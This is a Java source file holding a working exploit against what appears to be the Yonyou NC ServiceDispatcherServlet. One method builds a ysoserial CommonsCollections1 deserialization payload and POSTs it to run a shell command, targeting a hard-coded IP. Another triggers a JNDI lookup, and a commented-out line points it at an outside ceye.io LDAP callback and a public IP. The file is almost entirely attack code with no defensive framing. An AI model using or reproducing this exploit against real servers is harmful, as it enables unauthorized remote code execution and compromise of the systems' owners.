package com.example;

import nc.bs.framework.common.NCLocator;
import nc.bs.framework.comn.*;
import org.asynchttpclient.*;
import ysoserial.payloads.*;

import java.io.*;
import java.util.Properties;

public class NCTest {

    public static void attackJndi(String url, String jndipath) {
        Properties env = new Properties();
        env.put("SERVICEDISPATCH_URL", url + "/ServiceDispatcherServlet");
        NCLocator locator = NCLocator.getInstance(env);
        locator.lookup(jndipath);
    }

    public static void attackUnserial(String url, String cmd) throws Exception {
        url = url + "/ServiceDispatcherServlet/xxxx";
        ObjectPayload<?> payload = CommonsCollections1.class.newInstance();
        Object obj = payload.getObject(cmd);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        ByteArrayOutputStream temp = NetObjectOutputStream.convertObjectToBytes(obj, false, false);

        NetObjectOutputStream.writeInt(bos, temp.toByteArray().length);

        temp.writeTo(bos);

        AsyncHttpClient c = new DefaultAsyncHttpClient();

        c.preparePost(url)
                .setHeader("Content-Type", "application/x-java-serialized-object")
                .setBody(bos.toByteArray())
                .execute(new AsyncCompletionHandler<Response>() {
                    @Override
                    public Response onCompleted(Response response) throws Exception {
                        System.out.println(response.getResponseBody());
                        return response;
                    }

                    @Override
                    public void onThrowable(Throwable t) {
                        System.out.println("出现异常");
                        t.printStackTrace();
                        super.onThrowable(t);
                    }
                 }).toCompletableFuture().join();

        c.close();
    }



    public static void main(String[] args) throws Exception{
        String url = "http://192.168.127.55:8080";
        //url = "http://220.174.210.154:8000";
        //String jndi = "ldap://aaaaa.c3e2e6.ceye.io/ygiaz9";
        //attackJndi(url, jndi);
        attackUnserial(url, "cmd /c echo 1111 > 1111.txt");
        //test();

    }
}
